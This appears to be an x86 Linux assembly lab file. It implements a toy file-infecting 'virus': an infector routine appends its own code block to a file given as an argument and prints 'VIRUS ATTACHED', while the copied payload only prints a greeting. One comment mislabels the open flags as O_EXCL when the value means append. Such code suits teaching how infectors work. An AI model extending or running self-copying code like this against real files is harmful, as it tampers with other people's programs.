section .rodata
    hello_msg: db "Hello, Infected File", 10
    hello_msg_len: equ $ - hello_msg
    virus_msg: db " VIRUS ATTACHED", 10
    virus_msg_len: equ $ - virus_msg

section .text
global _start
global system_call
extern main
global infection
global infector
_start:
    pop dword ecx     ; ecx = argc
    mov esi, esp      ; argv
    
    mov eax, ecx      ; this part handels the *envp[]
    shl eax, 2        ; mul by 4, 4 bytes (pointers). we calculate the total size (in bytes) of the argv array
    add eax, esi      ; now eax hold the address right after the argv array
    add eax, 4        ; Adding 4 accounts for this null pointer

    push dword eax    ; *envp[] 
    push dword esi    ; *argv[]
    push dword ecx    ; argc

    call main        ; int main(int argc, char *argv[], char *envp[])

    mov ebx, eax     ; this is exit command
    mov eax, 1
    int 0x80
        
system_call:
    push ebp             
    mov ebp, esp
    sub esp, 4            ;  alloc 4 byte for local variable
    pushad                  

    mov eax, [ebp + 8]    ; syscall arg[0] (for example, WRITE 4)      
    mov ebx, [ebp + 12]   ; syscall arg[1] 
    mov ecx, [ebp + 16]   ; syscall arg[2]
    mov edx, [ebp + 20]   ; syscall arg[3]
    int 0x80            
    
    mov [ebp - 4], eax    
    popad 

    mov eax, [ebp - 4]    
    add esp, 4          
    pop ebp             
    ret                     

code_start:                          
infection:
    push ebp            
    mov ebp, esp
    pushad   
    
    mov eax, 4
    mov ebx, 1
    mov ecx, hello_msg
    mov edx, hello_msg_len
    int 0x80
    
    popad                  
    pop ebp
    ret

infector:
    push ebp            
    mov ebp, esp
    pushad   

    mov eax, 5
    mov ebx, [ebp + 8]
    mov ecx, 2001o     ; O_WRONLY | O_EXCL
    int 0x80
    
    mov edi, eax       ; edi = fd

    mov eax, 4
    mov ebx, edi
    mov ecx, code_start
    mov edx, code_end - code_start
    int 0x80

    mov eax, 4          
    mov ebx, 1          
    mov ecx, virus_msg   
    mov edx, virus_msg_len 
    int 0x80
    
    mov eax, 6
    mov ebx, edi
    int 0x80
    
    popad                   
    pop ebp             
    ret                    

code_end: